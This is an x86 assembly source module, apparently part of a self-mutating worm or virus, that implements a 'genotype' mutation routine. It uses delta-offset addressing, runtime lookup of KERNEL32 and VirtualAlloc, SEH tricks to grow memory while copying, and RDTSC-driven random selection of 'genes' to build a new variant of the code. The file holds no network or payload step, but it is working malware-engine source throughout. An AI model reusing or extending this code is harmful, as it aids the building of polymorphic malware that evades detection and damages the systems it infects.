;Descr:	This gen randomly mutates given genotype
;
;Type:	GEN_MUTATEGENOTYPE
;
;INPUT:
;(EBX)	DWORD	address of genotype to mutate
;
;OUTPUT:
;(EAX)	DWORD	address of new mutated genotype
;(EBX)	DWORD	size of new mutated genotype
;

mutate1	Proc
	pushad
	@SEH_SetupFrame	<jmp	m1_seh>			;__try block

	call	m1_delta
m1_delta:
	pop	ebp					;get delta offset

	push	ebx
	@pushsz	'KERNEL32'
	call	esi					;get address of KERNEL32.dll
	@pushsz	'VirtualAlloc'
	push	eax
	call	edi					;get address of VirtualAlloc API
	mov	[ebp + m1_VirtualAlloc - m1_delta],eax
	xchg	eax,edi
	pop	ebx

	push	PAGE_READWRITE
	push	MEM_RESERVE
	push	4000000h
	push	0
	call	edi					;reserve 64MB of memory

	push	PAGE_READWRITE
	push	MEM_COMMIT
	push	1000h
	push	eax
	call	edi					;alloc first 4096 bytez
	mov	[ebp + m1_newgenotype - m1_delta],eax
	mov	edi,eax

	add	eax,4
	mov	[ebp + m1_newgentable - m1_delta],eax	;save ptr to genotype table
	mov	esi,ebx
	mov	[ebp + m1_genotypebase - m1_delta],esi	;save ptr to new genotype
	lodsd
	xchg	eax,ecx					;count of genz in ECX
	imul	eax,ecx,GEN_SIZEOFGEN			;EAX = all genz*count
	add	eax,4					;add 4, reserve for count variable
	add	eax,[ebp + m1_newgenotype - m1_delta]	;EAX = ptr to genotype code storage
	mov	[ebp + m1_newgenptr - m1_delta],eax	;save it



	xor	edx,edx					;for EDX=GEN_INITWORM to EDX=GEN_COUNTOFGENS

m1_getgentype:
	pushad

	;get count of genz of the same type

	push	esi					; *
	xor	ebx,ebx					;nulify counter
m1_gc:	lodsb						;get type of gen
	cmp	al,dl					;is it the type we search for?
	jne	m1_gc_next				;no, get next gen
	inc	ebx					;yeah, increment counter
m1_gc_next:
	add	esi,GEN_SIZEOFGEN-1			;get to next gen
	loop	m1_gc					;do it ECX-timez
	pop	esi					; * restore ESI
	mov	ecx,ebx					;count of gens to ECX

	test	ecx,ecx					;ECX = number of genz of the same type
	je	m1_nextgentype				;no such gen, try next type



m1_get_to_gen:
	pushad
	mov	[ebp + m1_onepatch - m1_delta],ebp	;set non-NULL value
m1_gg:	lodsb						;get gen type
	add	esi,GEN_SIZEOFGEN-1			;get ptr to next gen
	cmp	al,dl					;is it right type of gen?
	jne	m1_gg					;no, get next gen
	loop	m1_gg					;loop ECX-timez
	sub	esi,GEN_SIZEOFGEN			;get ptr to found gen

	mov	ecx,12345678h				;check if at least
m1_onepatch = dword ptr $-4				;one gen was copied
	jecxz	m1_next					;yeah, continue

	mov	ecx,[esp.Pushad_ecx]			;no, check if it is
	dec	ecx					;last gen
	jecxz	m1_copygen				;yeah, copy last gen

m1_next:dw	310Fh					;RDTCS
	xor	edx,edx
	push	2					;two state result (0,1)
	pop	ecx
	div	ecx
	dec	edx
	je	m1_copygen				;1:2 chance to gen copying
m1_endcopy:
	popad
	loop	m1_get_to_gen				;choose next gen of the same type



m1_nextgentype:
	popad
	inc	edx
	cmp	edx,GEN_COUNTOFGENS+1
	jne	m1_getgentype				;try another type genz



m1_seh:	@SEH_RemoveFrame				;__except block
	popad
	mov	eax,12345678h				;return address of new genotype
m1_newgenotype = dword ptr $-4				;in EAX
	mov	ebx,12345678h
m1_newgenptr = dword ptr $-4				;and size of new genotype
	sub	ebx,eax					;in EBX
	ret






m1_copygen:
	mov	ebx,[ebp + m1_newgenotype - m1_delta]
	inc	dword ptr [ebx]				;increment count variable
	mov	edi,12345678h
m1_newgentable = dword ptr $-4
	movsb						;copy gen type
	mov	eax,[ebp + m1_newgenptr - m1_delta]
	push	eax
	sub	eax,ebx
	stosd						;save relative ptr to gen code
	lodsd
	xchg	eax,ecx
	lodsd
	stosd						;save size of gen code
	xchg	eax,ecx
	pop	edi
	mov	esi,12345678h
m1_genotypebase = dword ptr $-4
	add	esi,eax					;get address of gen code

	add	dword ptr [ebp + m1_newgentable - m1_delta],GEN_SIZEOFGEN
							;get to next gen
m1_copy_genz:
	call	m1_new_eh				;__try block


	;__except block

	mov	ecx,[esp.EH_ContextRecord]		;get address of context
	mov	esi,[ecx.CONTEXT_Esi]			;repair ESI register
	mov	edi,[ecx.CONTEXT_Edi]			;repair EDI register
	mov	ecx,[ecx.CONTEXT_Ecx]			;repair ECX register
	mov	esp,[esp.EH_EstablisherFrame]		;repair ESP register


	;alloc one page

	pushad
	push	PAGE_READWRITE
	push	MEM_COMMIT
	push	1000h
	push	edi
	mov	eax,12345678h
m1_VirtualAlloc = dword ptr $-4
	call	eax					;allocate next 4096 bytez
	popad
	@SEH_RemoveFrame				;remove SEH handler
	jmp	m1_copy_genz				;and try again



m1_new_eh:
	xor	edx,edx
	push	dword ptr fs:[edx]
	mov	fs:[edx],esp
	rep	movsb					;copy the gen
	@SEH_RemoveFrame				;remove SEH handler

	mov	[ebp + m1_newgenptr - m1_delta],edi	;save ptr where to copy next gen code
	mov	[ebp + m1_onepatch - m1_delta],edx	;set NULL value
	jmp	m1_endcopy

end_mutate1:
mutate1	EndP